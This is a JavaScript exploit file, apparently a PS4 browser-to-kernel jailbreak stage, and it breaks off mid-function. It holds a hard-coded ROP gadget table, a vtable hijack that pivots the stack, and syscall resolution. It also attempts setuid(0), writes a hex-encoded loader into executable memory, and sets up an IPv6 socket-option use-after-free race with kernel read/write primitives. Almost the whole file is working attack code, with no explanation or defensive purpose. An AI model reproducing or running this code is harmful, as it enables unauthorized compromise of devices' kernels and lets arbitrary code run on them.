var p;

var print = function (x) {
  document.getElementById("console").innerText += x + "\n";
}
var print = function (string) { // like print but html
  document.getElementById("console").innerHTML += string + "\n";
}

var get_jmptgt = function (addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));
  if (z != 0x25ff) return 0;

  return addr.add32(y + 6);
}

var gadgets;

window.stage2 = function () {
  try {
    window.stage2_();
  } catch (e) {
    print(e);
  }
}

gadgetcache = {
  "mov rsp, rdx; jmp rax": 0x14D8AA8,
  "ret": 0x0000003C,
  "ret2": 0x52,
  "pop rdi": 0x00038DBA,
  "pop rsi": 0x0008F38A,
  "pop rdx": 0x001BE024,
  "pop rcx": 0x00052E59,
  "pop r8": 0x000179C5,
  "pop r9": 0x00BB320F,
  "pop rax": 0x000043F5,
  "pop rsp": 0x0001E687,
  "mov [rdi], rax": 0x003ADAEB,
  "mov rax, [rax]": 0x0006C83A,
  "mov [rdi], rsi": 0x00023AC2,
  "infloop": 0x01545EAA,
  "adc eax, 0": 0x000FA12A,
  "mov edx, esi": 0x00BE59B9,
  "mov esi, [rdi]": 0x01056651,
  "mov rdx, rax": 0x00353B31,
  "mov rcx, rdx; mov [rsi], rcx": 0x016C6FB5,
  "add rax, rdx": 0x00209A03,
  "imul rax, rcx": 0x007E2046,
  "cmp edx, ecx": 0x013C368B,
  "mov [rdi], eax": 0x795257,
  "mov rax, rdi": 0x58D0,
  "mov rax, r8": 0x2A3B02,
};

var setJmpOffset = 0x8AE2C;
var setJmpGadget = 0x1438C73; // mov rdi, qword ptr [rax + 0x10]; jmp qword ptr [rax + 8];

var longJmpOffset = 0x8AEA8;
var longJmpGadget = 0x13D98EE; // mov rdx, qword ptr [rax + 0x10]; call qword ptr [rax + 8]; 
var longJmpGadget_thread = 0x15C609B; //mov rdx, qword ptr [rdi + 0xb0]; call qword ptr [rdi + 0x70];

var pthread_create_np_offset = 0x1A8C0;
var pthread_exit_offset = 0x18E80;
var libk__error_offset = 0x155A0;

window.stage2_ = function () {
  p = window.prim;

  var textArea = document.createElement("textarea");
  var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  var textAreaVtable = p.read8(textAreaVtPtr);
  var webKitBase = p.read8(textAreaVtable).sub32(0x7D3600);
  window.nogc.push(textArea);


  window.gadgets = {};

  for (var gadgetname in gadgetcache) {
    if (gadgetcache.hasOwnProperty(gadgetname)) {
      window.gadgets[gadgetname] = webKitBase.add32(gadgetcache[gadgetname]);
    }
  }

  var o2wk = function (o) {
    return webKitBase.add32(o);
  }
  gadgets2 = {
    "stack_chk_fail": o2wk(0xc8),
    "memset": o2wk(0x228)
  };

  p.malloc = function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  p.malloc32 = function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }
  p.arrayFromAddress = function (addr) {
    var arr_i = new Uint32Array(0x1000);
    var arr_ii = p.leakval(arr_i).add32(0x10);

    p.write8(arr_ii, addr);
    p.write4(arr_ii.add32(8), 0x40000);

    nogc.push(arr_i);
    return arr_i;
  }

  var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets2.memset));
  window.libSceLibcInternalBase = libSceLibcInternalBase;
  libSceLibcInternalBase.low &= 0xffffc000;
  libSceLibcInternalBase.sub32inplace(0x20000);

  var libKernelBase = p.read8(get_jmptgt(gadgets2.stack_chk_fail));
  window.libKernelBase = libKernelBase;
  libKernelBase.low &= 0xffffc000;
  libKernelBase.sub32inplace(0x10000);

  var fakeVtable = p.malloc32(0x200);
  var original_context = p.malloc32(0x40);
  var modified_context = p.malloc32(0x40);

  var launch_chain = function (chain) {


    chain.push(window.gadgets["pop rdx"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(0x8AEA8)); // longjmp

    p.write8(fakeVtable.add32(0x10), original_context);
    p.write8(fakeVtable.add32(0x8), libSceLibcInternalBase.add32(setJmpOffset));
    p.write8(fakeVtable.add32(0x1F8), webKitBase.add32(setJmpGadget)); // mov rdi, qword ptr [rax + 0x10]; jmp qword ptr [rax + 8];

    p.write8(textAreaVtPtr, fakeVtable);
    textArea.scrollLeft = 0x0;

    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack); // RSP = ropStack
    p.write8(modified_context.add32(0x18), chain.stack); // RBP = ropStack

    p.write8(fakeVtable.add32(0x10), modified_context);
    p.write8(fakeVtable.add32(0x8), libSceLibcInternalBase.add32(longJmpOffset));
    p.write8(fakeVtable.add32(0x1F8), webKitBase.add32(longJmpGadget)); //mov rdx, qword ptr [rax + 0x10]; call qword ptr [rax + 8]; 

    textArea.scrollLeft = 0x0;

    //p.write8(textAreaVtPtr, textAreaVtable);
  }

  p.loadchain = launch_chain;

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);

  var countbytes;
  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);

  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  var chain = new rop();
  var returnvalue;


  p.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);

    chain.push(window.gadgets["pop rdi"]);
    chain.push(chain.retval);
    chain.push(window.gadgets["mov [rdi], rax"]);

    chain.run();
    returnvalue = p.read8(chain.retval);
    return returnvalue;
  }

  p.readstr = function (addr) {
    var addr_ = addr.add32(0);
    var rd = p.read4(addr_);
    var buf = "";
    while (rd & 0xFF) {
      buf += String.fromCharCode(rd & 0xFF);
      addr_.add32inplace(1);
      rd = p.read4(addr_);
    }
    return buf;
  }

  p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    if (typeof sysc == "string") {
      sysc = window.syscallnames[sysc];
    }
    if (typeof sysc != "number") {
      throw new Error("invalid syscall");
    }

    var off = window.syscalls[sysc];
    if (off == undefined) {
      throw new Error("invalid syscall");
    }

    return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
  }

  p.stringify = function (str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  };

  var spawn_thread = function (name, chaino) {
    var new_thr = new rop();
    var context = p.malloc(0x1b8);
    var arg = context.add32(0x100);

    p.write8(context.add32(0x0), window.gadgets["ret"]);
    p.write8(context.add32(0x10), new_thr.stack);
    new_thr.push(window.gadgets["ret"]);
    chaino(new_thr);
    p.write8(context, window.gadgets["ret"]);
    p.write8(context.add32(0x10), new_thr.stack);

    p.write8(arg.add32(0xB0), context);
    p.write8(arg.add32(0x70), libSceLibcInternalBase.add32(longJmpOffset)); // longjmp
    //mov rdx, qword ptr [rdi + 0xb0]; call qword ptr [rdi + 0x70];

    var retv = function () {
      p.fcall(libKernelBase.add32(pthread_create_np_offset), context.add32(0x48), 0, webKitBase.add32(longJmpGadget_thread), arg, p.stringify(name));
    }
    window.nogc.push(new_thr);
    window.nogc.push(context);

    return retv;
  }
  var t = p.syscall("sys_setuid", 0);
  if (t.low == 0) {
    var payload_buffer = p.syscall(477, 0, 0x300000, 7, 0x41000, -1, 0);

    var payload_loader = p.malloc32(0x1000);
    var loader_writer = payload_loader.backing;
    loader_writer[0] = 0x56415741;
    loader_writer[1] = 0x83485541;
    loader_writer[2] = 0x894818EC;
    loader_writer[3] = 0xC748243C;
    loader_writer[4] = 0x10082444;
    loader_writer[5] = 0x483C2302;
    loader_writer[6] = 0x102444C7;
    loader_writer[7] = 0x00000000;
    loader_writer[8] = 0x000002BF;
    loader_writer[9] = 0x0001BE00;
    loader_writer[10] = 0xD2310000;
    loader_writer[11] = 0x00009CE8;
    loader_writer[12] = 0xC7894100;
    loader_writer[13] = 0x8D48C789;
    loader_writer[14] = 0xBA082474;
    loader_writer[15] = 0x00000010;
    loader_writer[16] = 0x000095E8;
    loader_writer[17] = 0xFF894400;
    loader_writer[18] = 0x000001BE;
    loader_writer[19] = 0x0095E800;
    loader_writer[20] = 0x89440000;
    loader_writer[21] = 0x31F631FF;
    loader_writer[22] = 0x0062E8D2;
    loader_writer[23] = 0x89410000;
    loader_writer[24] = 0x2C8B4CC6;
    loader_writer[25] = 0x45C64124;
    loader_writer[26] = 0x05EBC300;
    loader_writer[27] = 0x01499848;
    loader_writer[28] = 0xF78944C5;
    loader_writer[29] = 0xBAEE894C;
    loader_writer[30] = 0x00001000;
    loader_writer[31] = 0x000025E8;
    loader_writer[32] = 0x7FC08500;
    loader_writer[33] = 0xFF8944E7;
    loader_writer[34] = 0x000026E8;
    loader_writer[35] = 0xF7894400;
    loader_writer[36] = 0x00001EE8;
    loader_writer[37] = 0x2414FF00;
    loader_writer[38] = 0x18C48348;
    loader_writer[39] = 0x5E415D41;
    loader_writer[40] = 0x31485F41;
    loader_writer[41] = 0xC748C3C0;
    loader_writer[42] = 0x000003C0;
    loader_writer[43] = 0xCA894900;
    loader_writer[44] = 0x48C3050F;
    loader_writer[45] = 0x0006C0C7;
    loader_writer[46] = 0x89490000;
    loader_writer[47] = 0xC3050FCA;
    loader_writer[48] = 0x1EC0C748;
    loader_writer[49] = 0x49000000;
    loader_writer[50] = 0x050FCA89;
    loader_writer[51] = 0xC0C748C3;
    loader_writer[52] = 0x00000061;
    loader_writer[53] = 0x0FCA8949;
    loader_writer[54] = 0xC748C305;
    loader_writer[55] = 0x000068C0;
    loader_writer[56] = 0xCA894900;
    loader_writer[57] = 0x48C3050F;
    loader_writer[58] = 0x006AC0C7;
    loader_writer[59] = 0x89490000;
    loader_writer[60] = 0xC3050FCA;

    p.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));

    var loader_thr = spawn_thread("loader_thr", function (new_thr) {
      new_thr.push(window.gadgets["pop rdi"]);
      new_thr.push(payload_buffer);
      new_thr.push(payload_loader);
      new_thr.push(window.gadgets["pop rdi"]);
      new_thr.push(0);
      new_thr.push(libKernelBase.add32(pthread_exit_offset)); //pthread_exit

    });
    loader_thr();
    awaitpl();
    return;
  }
  //p.syscall(324, 2);
  //gets calling thr's errno pointer
  const errno_location = p.fcall(libKernelBase.add32(libk__error_offset));

  const AF_INET6 = 28;
  const SOCK_DGRAM = 2;
  const IPPROTO_UDP = 17;
  const IPPROTO_IPV6 = 41;
  const IPV6_TCLASS = 61;
  const IPV6_2292PKTOPTIONS = 25;
  const IPV6_RTHDR = 51;
  const IPV6_PKTINFO = 46;

  const SPRAY_TCLASS = 0x53;
  const TAINT_CLASS = 0x58;
  const NANOSLEEP_TIME = 0x249F0; //150µs
  const TCLASS_MASTER = 0x2AFE0000;
  const TCLASS_MASTER2 = 0x3EEF0000;

  const PKTOPTS_PKTINFO_OFFSET = 0x10;
  const PKTOPTS_RTHDR_OFFSET = 0x68;
  const PKTOPTS_TCLASS_OFFSET = 0xB0;

  const KNOTE_FOP_OFFSET = 0x68;
  const KNOTE_KN_OFFSET = 0x60;
  const FILTEROPS_DETACH_OFFSET = 0x10;

  const KERNEL_ALLPROC_OFFSET = 0x2382FF8;
  const KERNEL_SOCKETOPS_OFFSET = 0x19D58F0;
  const PROC_STRUCT_PID_OFFSET = 0xB0;

  const NUM_SPRAY_SOCKS = 0xC8;
  const NUM_LEAK_SOCKS = 0xC8;
  const NUM_SLAVE_SOCKS = 0xC8;
  const NUM_KQUEUES = 0x96;

  //memory block
  const size_of_triggered_ptr = 0x8;
  const size_of_valid_buf = 0x18;
  const size_of_nanosleep_ptr = 0x10;
  const size_of_spray_class = 0x8;
  const size_of_master_class = 0x8;
  const size_of_master_class2 = 0x8;
  const size_of_master_class3 = 0x8;
  const size_of_master_class_sz = 0x8;
  const size_of_msg_print = 0x10;
  const size_of_taint_class = 0x8;
  const size_of_tmp_class = 0x8;
  const size_of_rthdr_buf = 0x800;
  const size_of_master_sock_ptr = 0x8;
  const size_of_spray_socks_ptr = NUM_SPRAY_SOCKS * 0x4;
  const size_of_leak_socks_ptr = NUM_LEAK_SOCKS * 0x4;
  const size_of_slave_socks_ptr = NUM_SLAVE_SOCKS * 0x4;
  const size_of_find_overlap_ptr = NUM_SPRAY_SOCKS * 0x4;
  const size_of_rthdr_buf_len_ptr = 0x8;
  const size_of_spare_sock_ptr = 0x8;
  const size_of_kernel_read_buf_ptr = 0x18;
  const size_of_kernel_read_buf_len_ptr = 0x18;
  const size_of_slave_buf_ptr = 0x18;
  const size_of_slave_buf_len_ptr = 0x18;
  const size_of_find_slave_buf_ptr = 0x8 * NUM_SLAVE_SOCKS + 0x10
  const size_of_kqueues_ptr = NUM_KQUEUES * 0x4;
  const size_of_kevent_ptr = 0x20;
  const size_of_kevent_sock_ptr = 0x8;
  const size_of_fake_sockopts = 11 * 0x8;
  const var_memory = p.malloc(size_of_triggered_ptr + size_of_valid_buf + size_of_nanosleep_ptr + size_of_spray_class + size_of_master_class + size_of_master_class2 +
    size_of_master_class3 + size_of_master_class_sz + size_of_msg_print + size_of_taint_class + size_of_tmp_class + size_of_rthdr_buf + size_of_master_sock_ptr +
    size_of_spray_socks_ptr + size_of_leak_socks_ptr + size_of_slave_socks_ptr + size_of_find_overlap_ptr + size_of_rthdr_buf_len_ptr + size_of_spare_sock_ptr +
    size_of_kernel_read_buf_ptr + size_of_kernel_read_buf_len_ptr + size_of_slave_buf_ptr + size_of_slave_buf_len_ptr + size_of_find_slave_buf_ptr + size_of_kqueues_ptr +
    size_of_kevent_ptr + size_of_kevent_sock_ptr + size_of_fake_sockopts);

  const triggered_ptr = var_memory;
  const valid_buf = triggered_ptr.add32(size_of_triggered_ptr);
  const nanosleep_ptr = valid_buf.add32(size_of_valid_buf);
  const spray_class = nanosleep_ptr.add32(size_of_nanosleep_ptr);
  const master_class = spray_class.add32(size_of_spray_class);
  const master_class2 = master_class.add32(size_of_master_class);
  const master_class3 = master_class2.add32(size_of_master_class2);
  const master_class_sz = master_class3.add32(size_of_master_class3);
  const msg_print = master_class_sz.add32(size_of_master_class_sz);
  const taint_class = msg_print.add32(size_of_taint_class);
  const tmp_class = taint_class.add32(size_of_msg_print);
  const rthdr_buf = tmp_class.add32(size_of_tmp_class);
  const master_sock_ptr = rthdr_buf.add32(size_of_rthdr_buf);
  const spray_socks_ptr = master_sock_ptr.add32(size_of_master_sock_ptr);
  const leak_socks_ptr = spray_socks_ptr.add32(size_of_spray_socks_ptr);
  const slave_socks_ptr = leak_socks_ptr.add32(size_of_leak_socks_ptr);
  const find_overlap_ptr = slave_socks_ptr.add32(size_of_slave_socks_ptr);
  const rthdr_buf_len_ptr = find_overlap_ptr.add32(size_of_find_overlap_ptr);
  const spare_sock_ptr = rthdr_buf_len_ptr.add32(size_of_rthdr_buf_len_ptr);
  const kernel_read_buf_ptr = spare_sock_ptr.add32(size_of_spare_sock_ptr);
  const kernel_read_buf_len_ptr = kernel_read_buf_ptr.add32(size_of_kernel_read_buf_ptr);
  const slave_buf_ptr = kernel_read_buf_len_ptr.add32(size_of_kernel_read_buf_len_ptr);
  const slave_buf_len_ptr = slave_buf_ptr.add32(size_of_slave_buf_ptr);
  const find_slave_buf_ptr = slave_buf_len_ptr.add32(size_of_slave_buf_len_ptr);
  const kqueues_ptr = find_slave_buf_ptr.add32(size_of_find_slave_buf_ptr);
  const kevent_ptr = kqueues_ptr.add32(size_of_kqueues_ptr);
  const kevent_sock_ptr = kevent_ptr.add32(size_of_kevent_ptr);
  const fake_sockopts = kevent_sock_ptr.add32(size_of_kevent_sock_ptr);
  p.write8(rthdr_buf_len_ptr, 0x100);

  var overlapped_socket = -1;
  var overlapped_socket_idx = -1;
  var victim_sock = -1;
  var victim_sock_idx = -1;

  var pktopts_leak_addr = 0;
  var kevent_leak_addr = 0;
  var kernel_base = 0;

  for (var i = 0; i < 10; i++) {
    p.write8(fake_sockopts.add32(i * 0x8), window.gadgets["ret"]);
  }
  p.write8(fake_sockopts.add32(0x50), 1);

  p.write8(triggered_ptr, 0);

  p.write8(valid_buf.add32(0x0), 0x14);
  p.write8(valid_buf.add32(0x8), IPPROTO_IPV6);
  p.write8(valid_buf.add32(0xC), IPV6_TCLASS);
  p.write8(valid_buf.add32(0x10), 0x0);

  p.write8(nanosleep_ptr.add32(0x0), 0x0);
  p.write8(nanosleep_ptr.add32(0x8), NANOSLEEP_TIME);

  p.write8(spray_class, SPRAY_TCLASS);

  p.write8(master_class, 0x0);
  p.write8(master_class2, 0x0);
  p.write8(master_class3, 0x0);
  p.write8(master_class_sz, 0x4);

  p.write4(msg_print.add32(0x0), 0x4C4C4548);
  p.write4(msg_print.add32(0x4), 0x4F57204F);
  p.write4(msg_print.add32(0x8), 0x5C444C52);
  p.write4(msg_print.add32(0xC), 0x0000006E);

  p.write8(taint_class, TAINT_CLASS);
  p.write8(tmp_class, 0x10);

  for (var i = 0; i < 0x800; i += 8) {
    p.write8(rthdr_buf.add32(i), 0);
  }
  p.write4(rthdr_buf, 0x0F001E00);

  p.write8(kernel_read_buf_len_ptr, 0x14);
  p.write8(slave_buf_len_ptr, 0x14);

  chain.clear();
  chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
  chain.push(window.gadgets["pop rdi"]);
  chain.push(master_sock_ptr);
  chain.push(window.gadgets["mov [rdi], rax"]);
  chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
  chain.push(window.gadgets["pop rdi"]);
  chain.push(kevent_sock_ptr);
  chain.push(window.gadgets["mov [rdi], rax"]);
  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    chain.push(window.gadgets["pop rdi"]);
    chain.push(spray_socks_ptr.add32(0x4 * i));
    chain.push(window.gadgets["mov [rdi], eax"]);
  }
  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
    chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    chain.push(window.gadgets["pop rdi"]);
    chain.push(leak_socks_ptr.add32(0x4 * i));
    chain.push(window.gadgets["mov [rdi], eax"]);
  }
  for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
    chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    chain.push(window.gadgets["pop rdi"]);
    chain.push(slave_socks_ptr.add32(0x4 * i));
    chain.push(window.gadgets["mov [rdi], eax"]);
  }
  chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
  chain.push(window.gadgets["pop rdi"]);
  chain.push(spare_sock_ptr);
  chain.push(window.gadgets["mov [rdi], rax"]);
  for (var i = 0; i < NUM_KQUEUES; i++) {
    chain.fcall(window.syscalls[362]);
    chain.push(window.gadgets["pop rdi"]);
    chain.push(kqueues_ptr.add32(0x4 * i));
    chain.push(window.gadgets["mov [rdi], eax"]);
  }
  chain.run();
  const master_sock = p.read4(master_sock_ptr);
  const kevent_sock = p.read4(kevent_sock_ptr);

  const spray_socks = p.arrayFromAddress(spray_socks_ptr);
  const leak_socks = p.arrayFromAddress(leak_socks_ptr);
  const slave_socks = p.arrayFromAddress(slave_socks_ptr);
  const kqueues = p.arrayFromAddress(kqueues_ptr);
  const spare_sock = p.read8(spare_sock_ptr);


  //EV_SET(&kv, kevent_sock, EVFILT_READ, EV_ADD, 0, 5, NULL);
  p.write8(kevent_ptr.add32(0x0), kevent_sock);
  p.write8(kevent_ptr.add32(0x8), 0x1FFFF);
  p.write8(kevent_ptr.add32(0x10), 5);
  p.write8(kevent_ptr.add32(0x18), 0);
  p.write8(errno_location, 0);

  chain.clear();
  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
    chain.fcall(window.syscalls[105], leak_socks[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    chain.fcall(window.syscalls[105], leak_socks[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_class, 4);
  }
  chain.run();

  var thr1 = spawn_thread("thr1", function (new_thr) {

    var thr1_start_loop = new_thr.get_rsp();

    //condition 1 start
    var thr1_condition1_space = new_thr.create_equality_branch(triggered_ptr, 1);

    //condition 1 not equal
    var thr1_condition1_unequal = new_thr.get_rsp();
    new_thr.syscall_fix(118, master_sock, IPPROTO_IPV6, IPV6_TCLASS, master_class, master_class_sz);
    var thr1_condition2_space = new_thr.create_equality_branch(master_class, SPRAY_TCLASS);

    //condition 2 not equal
    var thr1_condition2_unequal = new_thr.get_rsp();
    new_thr.syscall_fix(105, master_sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_buf, size_of_valid_buf);
    new_thr.jmp_rsp(thr1_start_loop);

    //condition (1 || 2) equal
    var thr1_condition_equal = new_thr.get_rsp();
    new_thr.push_write8(triggered_ptr, 1);

    new_thr.push(window.gadgets["pop rdi"]);
    new_thr.push(0);
    new_thr.push(libKernelBase.add32(pthread_exit_offset)); //pthread_exit

    //setup
    new_thr.set_equality_branches(thr1_condition1_space, thr1_condition_equal, thr1_condition1_unequal);
    new_thr.set_equality_branches(thr1_condition2_space, thr1_condition_equal, thr1_condition2_unequal);
  });

  var thr2 = spawn_thread("thr2", function (new_thr) {
    var thr2_start_loop = new_thr.get_rsp();

    //condition 1 start
    var thr2_condition1_space = new_thr.create_equality_branch(triggered_ptr, 1);

    var thr2_condition1_unequal = new_thr.get_rsp();
    new_thr.syscall_fix(118, master_sock, IPPROTO_IPV6, IPV6_TCLASS, master_class2, master_class_sz);
    var thr2_condition2_space = new_thr.create_equality_branch(master_class2, SPRAY_TCLASS);

    var thr2_condition2_unequal = new_thr.get_rsp();
    new_thr.syscall_fix(105, master_sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    new_thr.syscall_fix(240, nanosleep_ptr, 0);
    new_thr.jmp_rsp(thr2_start_loop);

    var thr2_condition_equal = new_thr.get_rsp();
    new_thr.push_write8(triggered_ptr, 1);

    new_thr.push(window.gadgets["pop rdi"]);
    new_thr.push(0);
    new_thr.push(libKernelBase.add32(pthread_exit_offset)); //pthread_exit

    //setup
    new_thr.set_equality_branches(thr2_condition1_space, thr2_condition_equal, thr2_condition1_unequal);
    new_thr.set_equality_branches(thr2_condition2_space, thr2_condition_equal, thr2_condition2_unequal);
  });


  var new_thr3 = new rop();
  window.nogc.push(new_thr3);
  new_thr3.clear();


  var thr3_loop_start = new_thr3.get_rsp();
  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    new_thr3.syscall_fix(105, spray_socks[i], IPPROTO_IPV6, IPV6_TCLASS, spray_class, 4);
  }
  new_thr3.syscall_fix(118, master_sock, IPPROTO_IPV6, IPV6_TCLASS, master_class3, master_class_sz);
  var thr3_condition1_space = new_thr3.create_equality_branch(master_class3, SPRAY_TCLASS);


  var thr3_condition1_unequal = new_thr3.get_rsp();
  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    new_thr3.syscall_fix(105, spray_socks[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
  }
  new_thr3.syscall_fix(240, nanosleep_ptr, 0);
  new_thr3.jmp_rsp(thr3_loop_start);

  var thr3_condition1_equal = new_thr3.get_rsp();
  new_thr3.push_write8(triggered_ptr, 1);

  new_thr3.set_equality_branches(thr3_condition1_space, thr3_condition1_equal, thr3_condition1_unequal);

  new_thr3.fcall(window.syscalls[105], master_sock, IPPROTO_IPV6, IPV6_TCLASS, taint_class, 4);
  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    new_thr3.fcall(window.syscalls[118], spray_socks[i], IPPROTO_IPV6, IPV6_TCLASS, find_overlap_ptr.add32(0x4 * i), master_class_sz);
  }


  var fake_pktopts = function (pktinfo, tclass) {

    for (var i = 1; i < 0x100; i += 8) {
      p.write8(rthdr_buf.add32(i), 0);
    }
    p.write8(rthdr_buf, 0x0F001E00);

    new_thr3.clear();
    new_thr3.push_write8(rthdr_buf.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
    new_thr3.push_write8(tmp_class, 0x0);
    new_thr3.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

    for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
      new_thr3.push_write8(rthdr_buf.add32(PKTOPTS_TCLASS_OFFSET), (tclass | i)); //write modfied tclass
      new_thr3.syscall_fix(105, leak_socks[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, 0xF8); //set rthdr buffer
    }
    new_thr3.syscall_fix(118, master_sock, IPPROTO_IPV6, IPV6_TCLASS, tmp_class, master_class_sz);

    new_thr3.run();

    var ltclass = p.read4(tmp_class);
    if ((ltclass & 0xFFFF0000) == tclass) {
      return ltclass & 0x0000FFFF;
    }
    alert("failed to find rthdr <-> master sock overlap");
    return -1;

  }

  var leak_kmalloc = function (sz) {
    //only does 0x100 & 0x800, everything to avoid that build function hah
    var t = 0xF8;
    if (sz == 0x100) {
      t = 0xF8;
      for (var i = 1; i < 0x100; i += 8) {
        p.write8(rthdr_buf.add32(i), 0);
      }
      p.write8(rthdr_buf, 0x0F001E00);
      p.write8(rthdr_buf_len_ptr, 0x100);
    } else if (sz == 0x800) {
      t = 0x7F8;
      for (var i = 1; i < 0x800; i += 8) {
        p.write8(rthdr_buf.add32(i), 0);
      }
      p.write8(rthdr_buf, 0x7F00FE00);
      p.write8(rthdr_buf_len_ptr, 0x800);
    }
    new_thr3.clear();
    new_thr3.fcall(window.syscalls[105], master_sock, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, t);
    new_thr3.fcall(window.syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_buf_len_ptr);
    new_thr3.run();
    return p.read8(rthdr_buf.add32(PKTOPTS_RTHDR_OFFSET));
  }

  var leak_address = function () {

    kevent_leak_addr = leak_kmalloc(0x800);
    //alert("leaked kevent_leak_addr address = 0x" + kevent_leak_addr.toString(16));
    new_thr3.clear();
    new_thr3.fcall(window.syscalls[105], master_sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
    for (var i = 0; i < NUM_KQUEUES; i++) {
      new_thr3.fcall(window.syscalls[363], kqueues[i], kevent_ptr, 1, 0, 0, 0);
    }
    new_thr3.run();

    pktopts_leak_addr = leak_kmalloc(0x100);
    //alert("leaked pktopts address = 0x" + pktopts_leak_addr.toString(16));
    p.write8(tmp_class, 0);
    new_thr3.clear();
    new_thr3.fcall(window.syscalls[105], master_sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      new_thr3.fcall(window.syscalls[105], slave_socks[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_class, 4);
    }
    new_thr3.run();
  }
  var write_to_victim = function (addr) {
    p.write8(slave_buf_ptr.add32(0x0), addr);
    p.write8(slave_buf_ptr.add32(0x8), 0);
    p.write4(slave_buf_ptr.add32(0x10), 0);
    var r = p.syscall(105, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buf_ptr, 0x14);
    //alert("write_to_victim r = 0x" + r);
  }
  var find_victim = function () {
    write_to_victim(pktopts_leak_addr.add32(PKTOPTS_PKTINFO_OFFSET));
    new_thr3.clear();
    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      new_thr3.fcall(window.syscalls[118], slave_socks[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buf_ptr.add32(i * 8), slave_buf_len_ptr);
    }
    new_thr3.run();
    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      if (p.read4(find_slave_buf_ptr.add32(0x8 * i)) == pktopts_leak_addr.add32(PKTOPTS_PKTINFO_OFFSET).low) {
        victim_sock_idx = i;
        victim_sock = slave_socks[i];
        //alert("found slave :) -> 0x" + p.read8(find_slave_buf_ptr.add32(0x8 * i)));
        return;
      }
    }
    alert("failed to find slave");
  }

  var kernel_read8 = function (addr) {
    write_to_victim(addr);
    var r = p.syscall(118, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, kernel_read_buf_ptr, kernel_read_buf_len_ptr);
    return p.read8(kernel_read_buf_ptr);
  }
  var kernel_write8 = function (addr, value) {
    write_to_victim(addr);
    p.syscall(118, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, kernel_read_buf_ptr, kernel_read_buf_len_ptr);
    p.write8(kernel_read_buf_ptr, value);
    p.syscall(105, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, kernel_read_buf_ptr, 0x14);
  }
  var jit_me_proc = function (targetpp) {
